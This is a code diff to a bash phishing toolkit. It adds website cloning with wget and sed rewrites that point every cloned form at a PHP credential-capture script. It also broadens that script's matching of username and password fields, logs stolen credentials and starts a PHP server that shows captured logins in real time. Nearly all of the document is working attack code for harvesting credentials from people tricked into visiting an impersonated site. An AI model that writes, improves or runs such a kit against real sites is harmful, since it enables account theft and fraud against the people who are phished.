@@ -15,6 +15,35 @@ echo "║                                                 ║"
 echo "╚═════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
+# Check if required tools are installed
+check_dependencies() {
+    missing_deps=()
+    
+    # Check for wget
+    if ! command -v wget &> /dev/null; then
+        missing_deps+=("wget")
+    fi
+    
+    # Check for php
+    if ! command -v php &> /dev/null; then
+        missing_deps+=("php")
+    fi
+    
+    # Check for sed
+    if ! command -v sed &> /dev/null; then
+        missing_deps+=("sed")
+    fi
+    
+    # Install missing dependencies
+    if [ ${#missing_deps[@]} -ne 0 ]; then
+        echo -e "${YELLOW}[INFO]${NC} Installing missing dependencies: ${missing_deps[*]}"
+        apt-get update -qq && apt-get install -y "${missing_deps[@]}"
+    fi
+}
+
+# Check dependencies
+check_dependencies
+
 # Load environment variables
 if [ -f .env ]; then
     source .env
@@ -31,9 +60,10 @@ fi
 mkdir -p phishing_site
 cd phishing_site
 
-# Create login page
-echo -e "${YELLOW}[INFO]${NC} Creating phishing login page..."
-cat > index.html << 'EOF'
+# Function to create default phishing login page
+create_default_page() {
+    echo -e "${YELLOW}[INFO]${NC} Creating default phishing login page..."
+    cat > index.html << 'EOF'
 <!DOCTYPE html>
 <html>
 <head>
@@ -116,8 +146,86 @@ cat > index.html << 'EOF'
 </body>
 </html>
 EOF
+}
 
-# Create credential capture script
+# Function to clone a website
+clone_website() {
+    local target_url=$1
+    local clone_dir="cloned_site"
+    
+    # Create temporary directory for cloning
+    mkdir -p "$clone_dir"
+    
+    echo -e "${YELLOW}[INFO]${NC} Cloning website: $target_url"
+    
+    # Download the website with wget
+    wget --quiet \
+         --no-parent \
+         --no-check-certificate \
+         --page-requisites \
+         --convert-links \
+         --adjust-extension \
+         --span-hosts \
+         --domains=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*$||') \
+         --directory-prefix="$clone_dir" \
+         --max-redirect=2 \
+         --tries=3 \
+         --timeout=30 \
+         --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" \
+         "$target_url"
+    
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}[ERROR]${NC} Failed to clone website. Using default login page."
+        create_default_page
+        return 1
+    fi
+    
+    # Find all HTML files in the cloned directory
+    echo -e "${YELLOW}[INFO]${NC} Modifying forms to capture credentials..."
+    find "$clone_dir" -name "*.html" -o -name "*.htm" | while read html_file; do
+        # Look for forms and modify them to submit to our credential capture script
+        sed -i 's/<form[^>]*action="[^"]*"/<form action="credentials.php"/g' "$html_file"
+        sed -i 's/<form[^>]*action='\''[^'\'']*'\''/<form action='\''credentials.php'\''/g' "$html_file"
+        # For forms without an action attribute
+        sed -i 's/<form[^>]*>/<form action="credentials.php" method="post">/g' "$html_file"
+    done
+    
+    # Find the main HTML file (usually index.html)
+    local main_html=$(find "$clone_dir" -name "index.html" -o -name "index.htm" -o -name "default.html" | head -1)
+    
+    # If no index file found, use the first HTML file
+    if [ -z "$main_html" ]; then
+        main_html=$(find "$clone_dir" -name "*.html" -o -name "*.htm" | head -1)
+    fi
+    
+    # If we found a main HTML file, copy it to our root
+    if [ -n "$main_html" ]; then
+        echo -e "${YELLOW}[INFO]${NC} Using $main_html as the main page"
+        cp "$main_html" index.html
+        
+        # Copy all other files in the directory to the current directory
+        cp -r "$clone_dir"/* ./
+    else
+        echo -e "${RED}[ERROR]${NC} No HTML files found in cloned site. Using default login page."
+        create_default_page
+    fi
+    
+    # Clean up
+    rm -rf "$clone_dir"
+    
+    echo -e "${GREEN}[SUCCESS]${NC} Website cloned and configured for credential harvesting"
+}
+
+# Check if a URL was provided as argument
+if [ -n "$1" ]; then
+    # Clone the provided website
+    clone_website "$1"
+else
+    # Use default login page
+    create_default_page
+fi
+
+# Create credential capture script regardless of the website used
 echo -e "${YELLOW}[INFO]${NC} Creating credential capture script..."
 cat > credentials.php << 'EOF'
 <?php
@@ -149,14 +257,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             stripos($key, 'email') !== false || 
             stripos($key, 'login') !== false || 
             stripos($key, 'id') !== false || 
-            stripos($key, 'account') !== false) {
+            stripos($key, 'account') !== false || 
+            stripos($key, 'name') !== false || 
+            stripos($key, 'mail') !== false) {
             $username = $value;
         }
         
         // Look for common password field names
         if (stripos($key, 'pass') !== false || 
             stripos($key, 'pwd') !== false || 
-            stripos($key, 'secret') !== false) {
+            stripos($key, 'secret') !== false || 
+            stripos($key, 'pw') !== false) {
             $password = $value;
         }
     }
@@ -196,6 +307,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Write to log file
     file_put_contents($log_file, $log_entry, FILE_APPEND);
 
+    // Output to the browser (this will be seen in the PHP error log)
+    error_log("CREDENTIALS CAPTURED - Username: $username, Password: $password");
+    
     // Display captured credentials in real-time in the terminal
     echo "SUCCESS! Credentials captured:\nUsername: $username\nPassword: $password\n";
     
@@ -209,9 +323,10 @@ EOF
 # Go back to parent directory
 cd ..
 
-# Create HTML email template
-echo -e "${YELLOW}[INFO]${NC} Creating HTML email template..."
-cat > html_email_template.html << EOF
+# Create HTML email template if it doesn't exist
+if [ ! -f html_email_template.html ]; then
+    echo -e "${YELLOW}[INFO]${NC} Creating HTML email template..."
+    cat > html_email_template.html << EOF
 <!DOCTYPE html>
 <html>
 <head>
@@ -291,6 +406,7 @@ cat > html_email_template.html << EOF
 </body>
 </html>
 EOF
+fi
 
 # Start PHP server and monitor for credentials in one step
 echo -e "${GREEN}[STATUS]${NC} Starting the phishing web server with real-time credential capture..."
@@ -300,6 +416,9 @@ echo -e "${YELLOW}[INFO]${NC} Attempting to start on port 80..."
 trap 'kill $(jobs -p) 2>/dev/null' EXIT
 
 cd phishing_site
+
+# Create an empty credentials file if it doesn't exist
+touch captured_credentials.txt
 
 # Display real-time credentials 
 tail -f captured_credentials.txt 2>/dev/null &
